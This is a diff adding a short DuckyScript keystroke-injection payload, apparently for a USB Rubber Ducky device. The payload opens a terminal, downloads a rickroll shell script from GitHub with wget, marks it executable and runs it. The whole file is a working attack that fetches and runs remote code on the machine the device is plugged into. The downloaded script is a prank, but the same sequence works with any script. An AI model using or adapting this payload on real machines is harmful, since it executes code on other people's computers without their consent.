@@ -1,0 +1,16 @@
+REM FalsePhilosopher
+REM WIP
+REM bash version
+DELAY 300
+CTRL-ALT+t
+DELAY 500
+STRING wget https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh
+DELAY 300
+ENTER
+STRING chmod +x roll.sh
+DELAY 300
+ENTER
+DELAY 200
+STRING ./roll.sh
+DELAY 300
+ENTER
